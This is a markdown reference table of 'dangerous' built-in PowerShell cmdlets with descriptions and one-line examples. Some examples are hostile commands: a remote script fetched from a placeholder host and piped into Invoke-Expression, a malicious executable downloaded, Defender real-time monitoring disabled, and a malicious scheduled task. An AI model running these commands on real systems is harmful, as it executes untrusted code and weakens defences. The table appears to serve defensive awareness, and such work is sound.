# Dangerous Inbuilt PowerShell Cmdlets

| **Cmdlet**                 | **Description**                                                      | **Example**                                                                 |
|---------------------------|----------------------------------------------------------------------|----------------------------------------------------------------------------|
| **`Invoke-Expression` (iex)** | Executes a string as a PowerShell command.                           | `iex $command`                                                              |
| **`Start-Process`**      | Launches a new process.                                            | `Start-Process "C:\path\to\malicious.exe"`                               |
| **`Invoke-WebRequest`**  | Sends HTTP and HTTPS requests.                                      | `Invoke-WebRequest -Uri "http://example.com/malicious.exe" -OutFile "C:\path\to\malicious.exe"` |
| **`Invoke-RestMethod`**  | Sends HTTP and HTTPS requests and processes the response.          | `Invoke-RestMethod -Uri "http://example.com/malicious.ps1" | Invoke-Expression` |
| **`New-Object`**         | Creates an instance of a .NET Framework or COM object.              | `$webClient = New-Object System.Net.WebClient`                            |
| **`Get-Content`**        | Retrieves the content of a file or other item.                      | `Get-Content "C:\path\to\malicious.ps1" | Invoke-Expression`              |
| **`Set-ExecutionPolicy`**| Changes the user preference for the PowerShell script execution policy. | `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`    |
| **`Add-Type`**           | Adds a .NET Framework type to a PowerShell session.                  | `Add-Type -TypeDefinition $typeDefinition`                               |
| **`Get-Process`**        | Retrieves a list of processes running on the local machine.        | `Get-Process | Where-Object { $_.Name -eq "targetProcess" }`                 |
| **`Stop-Process`**      | Stops a running process.                                            | `Stop-Process -Name "maliciousProcess"`                                   |
| **`Remove-Item`**        | Deletes files or folders.                                           | `Remove-Item -Path "C:\path\to\file.txt" -Recurse -Force`                 |
| **`Set-MpPreference`**   | Configures Windows Defender preferences.                           | `Set-MpPreference -DisableRealtimeMonitoring $true`                       |
| **`Get-EventLog`**      | Retrieves entries from event logs.                                  | `Get-EventLog -LogName Security -Newest 10`                              |
| **`Export-Csv`**         | Exports data to a CSV file.                                         | `Get-Process | Export-Csv -Path "C:\path\to\processes.csv"`                  |
| **`Get-EventSubscriber`**| Retrieves event subscribers.                                        | `Get-EventSubscriber`                                                     |
| **`New-PSDrive`**        | Creates a new PowerShell drive.                                    | `New-PSDrive -Name "RemoteDrive" -PSProvider FileSystem -Root "\\remote\share"` |
| **`Get-CimInstance`**    | Retrieves CIM (Common Information Model) instances.                 | `Get-CimInstance -ClassName Win32_OperatingSystem`                        |
| **`Get-ADUser`**        | Retrieves Active Directory user accounts.                           | `Get-ADUser -Filter * | Select-Object -Property Name,SamAccountName`      |
| **`Get-WmiObject`**    | Retrieves management information from WMI (Windows Management Instrumentation). | `Get-WmiObject -Class Win32_ComputerSystem`                              |
| **`New-ScheduledTask`** | Creates a new scheduled task.                                      | `New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\malicious.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am)` |

